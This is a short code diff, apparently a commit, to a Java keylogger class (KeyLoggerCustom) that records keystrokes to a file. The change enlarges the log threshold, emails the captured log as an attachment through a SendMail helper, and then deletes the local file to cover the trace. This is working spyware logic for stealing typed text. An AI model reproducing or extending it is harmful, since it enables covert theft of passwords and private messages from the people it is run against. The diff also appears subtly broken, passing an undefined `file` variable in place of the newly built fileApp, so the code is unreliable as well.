@@ -22,7 +22,7 @@ public class KeyLoggerCustom implements NativeKeyListener{
 	private static final String FILE_NAME="012345.txt";
 	
 	private SendMail sendMail;
-	private static final Long maxSize=45L;
+	private static final Long maxSize=1024L;
 	
 	public void nativeKeyTyped(NativeKeyEvent nativeEvent) {
 		
@@ -78,8 +78,12 @@ public class KeyLoggerCustom implements NativeKeyListener{
 			boolean invia=inviaEmail();
 			if(invia) {
 				sendMail=new SendMail();
+				File fileApp=null;
 				try {
-					sendMail.sendMailConAttachment(new File(PATH+"logger/"+FILE_NAME));
+					fileApp=new File(PATH+"logger/"+FILE_NAME);
+					sendMail.sendMailConAttachment(file);
+					fileApp.delete();
+					
 				} catch (Exception e) {
 					// TODO Auto-generated catch block
 					e.printStackTrace();
